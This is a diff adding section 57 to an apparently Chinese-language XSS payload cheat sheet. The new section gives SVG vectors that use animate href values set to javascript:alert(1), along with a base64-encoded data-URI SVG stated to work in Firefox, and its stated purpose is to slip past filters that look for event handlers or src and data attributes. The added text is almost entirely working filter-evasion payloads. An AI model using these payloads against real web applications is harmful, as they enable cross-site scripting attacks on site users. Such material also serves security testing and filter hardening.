@@ -361,8 +361,21 @@ status.html&msg=<script>alert(1)</script>
 <svg><set end=1 onend=alert(1)>
 ```
 
-
-
+**57.SVG Vectors without Event Handlers (不带事件处理程序的SVG向量)** <br>
+以下payload用于避免过滤器查找事件处理程序或src、data等。进行url编码后的最后一个payload仅适用于Firefox
+```
+<svg><a><rect width=99% height=99% /><animate attributeName=href
+to=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href
+values=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href to=0
+from=javascript:alert(1)>
+<svg><use xlink:href=data:image/svg
+%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAv
+c3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI
+%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9Imp
+hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
+```
 
 ## 致谢
 **英文议题作者：** <br>
